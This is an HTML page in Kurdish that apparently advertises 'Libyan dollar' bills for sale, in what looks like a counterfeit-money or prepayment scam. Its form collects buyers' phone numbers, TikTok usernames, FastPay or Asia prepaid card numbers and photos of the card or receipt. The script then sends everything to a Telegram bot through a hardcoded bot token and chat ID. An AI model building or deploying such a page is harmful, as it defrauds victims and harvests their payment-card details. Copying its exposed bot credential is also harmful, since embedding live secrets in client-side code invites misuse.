<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دۆلاری لیبی هیوا</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 15px;
            color: #333;
            background-image: url('https://i.ibb.co/0jQ7X0t/libyan-dinar-bills.jpg');
            background-size: cover;
            background-attachment: fixed;
            background-position: center;
            background-blend-mode: overlay;
        }
        .container {
            max-width: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
            backdrop-filter: blur(2px);
        }
        .logo {
            text-align: center;
            margin-bottom: 15px;
        }
        .logo img {
            width: 150px;
            height: auto;
            border-radius: 10px;
            border: 2px solid #0066cc;
        }
        h1 {
            color: #0066cc;
            text-align: center;
            font-size: 22px;
            margin-bottom: 15px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        h2 {
            font-size: 18px;
            text-align: center;
            margin-bottom: 15px;
            color: #333;
        }
        .price-option {
            border: 1px solid #ddd;
            padding: 12px;
            margin-bottom: 12px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            background-color: rgba(255,255,255,0.8);
        }
        .price-option:hover {
            transform: translateY(-2px);
            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
        }
        .price-option.selected {
            border: 2px solid #0066cc;
            background-color: #e6f2ff;
        }
        .price-option h3 {
            margin: 0;
            font-size: 16px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
            background-color: rgba(255,255,255,0.8);
            padding: 10px;
            border-radius: 8px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            font-size: 14px;
            color: #444;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 14px;
            background-color: #fff;
            text-align: right;
            direction: rtl;
        }
        .upload-area {
            border: 2px dashed #0066cc;
            padding: 15px;
            text-align: center;
            margin-top: 10px;
            border-radius: 8px;
            font-size: 14px;
            background-color: rgba(230, 242, 255, 0.5);
            cursor: pointer;
        }
        .image-preview {
            margin-top: 10px;
            text-align: center;
        }
        .image-preview img {
            max-width: 100%;
            max-height: 200px;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        button {
            background-color: #0066cc;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 15px;
            transition: all 0.3s;
            font-weight: bold;
        }
        button:hover {
            background-color: #0055aa;
            transform: translateY(-2px);
            box-shadow: 0 3px 5px rgba(0,0,0,0.2);
        }
        button:active {
            transform: translateY(0) !important;
        }
        small {
            font-size: 12px;
            color: #666;
            display: block;
            margin-top: 5px;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
            color: #0066cc;
            font-weight: bold;
        }
        .payment-details {
            margin-top: 5px;
            font-size: 13px;
            color: #555;
        }
        .payment-instructions {
            background-color: #f0f8ff;
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            border-right: 4px solid #0066cc;
            font-size: 13px;
        }
        .payment-instructions ol {
            padding-right: 15px;
        }
        
        @keyframes dollarSpin {
            0% { transform: rotateY(0deg); }
            100% { transform: rotateY(360deg); }
        }
        
        .success-message {
            display: none;
            text-align: center;
            padding: 25px;
            background: linear-gradient(135deg, #0066cc, #00cc66);
            color: white;
            border-radius: 10px;
            margin: 20px 0;
            animation: fadeIn 0.5s ease-in-out;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            border: 2px solid white;
        }
        
        .dollar-emoji {
            font-size: 60px;
            display: inline-block;
            animation: dollarSpin 2s linear infinite, float 3s ease-in-out infinite;
            margin: 15px 0;
            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }
        
        .success-text {
            font-size: 18px;
            line-height: 1.6;
            margin: 10px 0;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes float {
            0% { transform: translateY(0px) rotateY(0deg); }
            50% { transform: translateY(-15px) rotateY(180deg); }
            100% { transform: translateY(0px) rotateY(360deg); }
        }
        
        .contact-info {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            color: #555;
            padding: 10px;
            background-color: rgba(255,255,255,0.8);
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://i.ibb.co/kf16Ds4/Screenshot-2025-06-06-05-06-08-907-com-zhiliaoapp-musically-edit.jpg" alt="دۆلاری لیبی هیوا">
        </div>
        <h1>دۆلاری لیبی هیوا</h1>
        <h2>نرخی گەڵاکان</h2>
        
        <div class="price-option" onclick="selectOption(this, '20')">
            <h3>20 گەڵا - 400 هەزار</h3>
            <div class="payment-details">بە کارتی ئاسیا: 400,000 دینار</div>
            <div class="payment-details">بە فاستپەی: 400,000 دینار</div>
        </div>
        
        <div class="price-option" onclick="selectOption(this, '40')">
            <h3>40 گەڵا - 700 هەزار</h3>
            <div class="payment-details">بە کارتی ئاسیا: 700,000 دینار</div>
            <div class="payment-details">بە فاستپەی: 700,000 دینار</div>
        </div>
        
        <div class="form-group">
            <label for="phone">ژمارە مۆبایلی:</label>
            <input type="tel" id="phone" placeholder="7712345678" pattern="[0-9]{10}">
            <small>(بەبێ +964 بنووسە)</small>
        </div>
        
        <div class="form-group">
            <label for="tiktok">یوزەری تیکتۆک:</label>
            <input type="text" id="tiktok" placeholder="@username">
        </div>
        
        <div class="form-group">
            <label for="payment">پارەدان:</label>
            <select id="payment" onchange="showPaymentMethod()">
                <option value="">هەڵبژێرە</option>
                <option value="fastpay">فاستپەی</option>
                <option value="asia">کارتی ئاسیا</option>
            </select>
        </div>
        
        <div id="fastpay-method" class="form-group" style="display:none;">
            <label>وێنەی پارەدان:</label>
            <div class="upload-area" onclick="document.getElementById('fastpay-receipt').click()">
                <p>وێنەی پارەدان هەڵبگرە یان کلیک بکە</p>
                <input type="file" id="fastpay-receipt" accept="image/*" style="display:none;" onchange="previewImage(this, 'fastpay-preview')">
            </div>
            <div id="fastpay-preview" class="image-preview"></div>
            <label for="fastpay-number" style="margin-top:10px;">ژمارە فاستپەی:</label>
            <input type="text" id="fastpay-number" placeholder="07712345678">
            <small>بڕی پارە: <span id="fastpay-amount">0</span> دینار</small>
            
            <div class="payment-instructions">
                <h4>ڕێنمایی پارەدان بە فاستپەی:</h4>
                <ol>
                    <li>ئەپلیکەیشنی فاستپەی بکەرەوە</li>
                    <li>بچۆ سەر "پارە ناردن"</li>
                    <li>ژمارەی فاستپەی ئێمە بنووسە: <strong>7506590395</strong></li>
                    <li>بڕی پارەکە بنووسە (<span id="fastpay-instruction-amount">400</span> هەزار دینار)</li>
                    <li>پارەکە بنێرە و وێنەی بەڵگەنامەکە هەڵبگرە</li>
                </ol>
            </div>
        </div>
        
        <div id="asia-method" class="form-group" style="display:none;">
            <label>وێنەی کارت:</label>
            <div class="upload-area" onclick="document.getElementById('asia-receipt').click()">
                <p>وێنەی کارت هەڵبگرە یان کلیک بکە</p>
                <input type="file" id="asia-receipt" accept="image/*" style="display:none;" onchange="previewImage(this, 'asia-preview')">
            </div>
            <div id="asia-preview" class="image-preview"></div>
            <label for="asia-number" style="margin-top:10px;">ژمارە کارتی ئاسیا:</label>
            <input type="text" id="asia-number" placeholder="6037 XXXX XXXX XXXX">
            <small>بڕی پارە: <span id="asia-amount">0</span> دینار</small>
        </div>
        
        <div id="loading" class="loading">
            <p>تکایە چاوەڕێ بکە... زانیاریەکان نێردەرێن</p>
        </div>
        
        <div id="success-message" class="success-message">
            <div class="dollar-emoji">💵</div>
            <h3 style="font-size: 22px; margin-bottom: 15px;">سوپاس بۆ ناردنی زانیاریەکان!</h3>
            <p class="success-text">
                ئەگەر زانیاریەکانت درووست بێت<br>
                بە زووترین کات تیمیەکەمان پەیوەندیت پێوە ئەکات
            </p>
            <div style="font-size: 24px; margin-top: 10px;">🙏</div>
        </div>
        
        <button onclick="submitForm()">تۆمارکردن</button>
        
        <div class="contact-info">
            <p>پەیوەندی: <strong>@example_username</strong> (تیکتۆک)</p>
            <p>کاتەکانی کارکردن: 10:00 AM - 10:00 PM (هەموو ڕۆژە)</p>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7959091840:AAGQNGFSnAmxp2PRqU44UmJEVo8ecv_5iUA';
        const CHAT_ID = '7594104612';
        
        let selectedOption = null;
        let selectedAmount = 0;
        
        function selectOption(element, option) {
            document.querySelectorAll('.price-option').forEach(el => {
                el.classList.remove('selected');
            });
            
            element.classList.add('selected');
            selectedOption = option;
            
            if (option === '20') {
                selectedAmount = 400000;
            } else if (option === '40') {
                selectedAmount = 700000;
            }
            
            // نوێکردنەوەی بڕی پارە لە هەموو شوێنەکان
            document.getElementById('fastpay-amount').textContent = selectedAmount.toLocaleString();
            document.getElementById('asia-amount').textContent = selectedAmount.toLocaleString();
            document.getElementById('fastpay-instruction-amount').textContent = selectedAmount.toLocaleString();
        }
        
        function showPaymentMethod() {
            const method = document.getElementById('payment').value;
            
            document.getElementById('fastpay-method').style.display = 'none';
            document.getElementById('asia-method').style.display = 'none';
            
            if (method === 'fastpay') {
                document.getElementById('fastpay-method').style.display = 'block';
            } else if (method === 'asia') {
                document.getElementById('asia-method').style.display = 'block';
            }
        }
        
        function previewImage(input, previewId) {
            const preview = document.getElementById(previewId);
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.innerHTML = `<img src="${e.target.result}" alt="وێنەی هەڵگیراو">`;
                }
                reader.readAsDataURL(input.files[0]);
            }
        }
        
        function validateFastpay(number) {
            return /^07[0-9]{8}$/.test(number);
        }
        
        function validateAsiaCard(number) {
            return /^6037\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4}$/.test(number);
        }
        
        async function submitForm() {
            // پشکنینی زانیاریەکان
            if (!selectedOption) {
                alert('تکایە ژمارەی گەڵاکان هەڵبژێرە');
                return;
            }
            
            const phone = document.getElementById('phone').value;
            if (!phone || !/^[0-9]{10}$/.test(phone)) {
                alert('ژمارە مۆبایلی 10 ژمارەیی بنووسە (بەبێ +964)');
                return;
            }
            
            const tiktok = document.getElementById('tiktok').value;
            if (!tiktok) {
                alert('تکایە یوزەری تیکتۆک بنووسە');
                return;
            }
            
            const payment = document.getElementById('payment').value;
            if (!payment) {
                alert('تکایە شێوازی پارەدان هەڵبژێرە');
                return;
            }
            
            let receiptFile = null;
            let paymentDetails = '';
            
            if (payment === 'fastpay') {
                receiptFile = document.getElementById('fastpay-receipt').files[0];
                const number = document.getElementById('fastpay-number').value;
                
                if (!receiptFile) {
                    alert('تکایە وێنەی پارەدان هەڵبگرە');
                    return;
                }
                
                if (!number || !validateFastpay(number)) {
                    alert('تکایە ژمارە فاستپەیەکی دروست بنووسە (07712345678)');
                    return;
                }
                
                paymentDetails = `فاستپەی: ${number} | بڕ: ${selectedAmount.toLocaleString()} دینار | ژمارەی ئێمە: 7506590395`;
            } else if (payment === 'asia') {
                receiptFile = document.getElementById('asia-receipt').files[0];
                const number = document.getElementById('asia-number').value;
                
                if (!receiptFile) {
                    alert('تکایە وێنەی کارت هەڵبگرە');
                    return;
                }
                
                if (!number || !validateAsiaCard(number)) {
                    alert('تکایە ژمارە کارتی ئاسیای دروست بنووسە (6037 XXXX XXXX XXXX)');
                    return;
                }
                
                paymentDetails = `کارتی ئاسیا: ${number} | بڕ: ${selectedAmount.toLocaleString()} دینار`;
            }
            
            // پشکنینی دواجار
            if (!confirm('دڵنیایت لە زانیاریەکان؟ دوای ناردن ناتوانرێ گۆڕانکاری بکرێت')) {
                return;
            }
            
            // نیشاندانی بارکردن
            document.getElementById('loading').style.display = 'block';
            document.getElementById('success-message').style.display = 'none';
            
            try {
                // دروستکردنی زانیاریەکان
                const message = `✅ داواکاری نوێ\n\n` +
                               `📌 جۆری داواکاری: ${selectedOption === '20' ? '20 گەڵا (400K)' : '40 گەڵا (700K)'}\n` +
                               `💰 بڕی پارە: ${selectedAmount.toLocaleString()} دینار\n` +
                               `📞 ژمارە مۆبایل: +964${phone}\n` +
                               `📱 تیکتۆک: ${tiktok}\n` +
                               `💳 ${paymentDetails}`;
                
                // ناردنی نامەکە بۆ بۆت
                await sendToTelegram(message);
                
                // ناردنی وێنەکە بۆ بۆت
                if (receiptFile) {
                    await sendPhotoToTelegram(receiptFile);
                }
                
                // نیشاندانی پەیامی سەرکەوتوویی
                document.getElementById('success-message').style.display = 'block';
                document.getElementById('loading').style.display = 'none';
                
                // پاککردنەوەی فۆرمەکە
                setTimeout(() => {
                    resetForm();
                    document.getElementById('success-message').style.display = 'none';
                }, 6000);
                
            } catch (error) {
                console.error('هەڵە لە ناردنی زانیاریەکان:', error);
                alert('❌ هەڵەیەک ڕوویدا لە ناردنی زانیاریەکان. تکایە دووبارە هەوڵبدەرەوە');
                document.getElementById('loading').style.display = 'none';
            }
        }
        
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            if (!response.ok) {
                throw new Error('کێشە هەیە لە ناردنی نامەکە');
            }
        }
        
        async function sendPhotoToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            
            if (!response.ok) {
                throw new Error('کێشە هەیە لە ناردنی وێنەکە');
            }
        }
        
        function resetForm() {
            document.querySelectorAll('.price-option').forEach(el => {
                el.classList.remove('selected');
            });
            document.getElementById('phone').value = '';
            document.getElementById('tiktok').value = '';
            document.getElementById('payment').value = '';
            document.getElementById('fastpay-number').value = '';
            document.getElementById('asia-number').value = '';
            document.getElementById('fastpay-receipt').value = '';
            document.getElementById('asia-receipt').value = '';
            document.getElementById('fastpay-preview').innerHTML = '';
            document.getElementById('asia-preview').innerHTML = '';
            document.getElementById('fastpay-method').style.display = 'none';
            document.getElementById('asia-method').style.display = 'none';
            selectedOption = null;
            selectedAmount = 0;
        }
    </script>
</body>
</html>
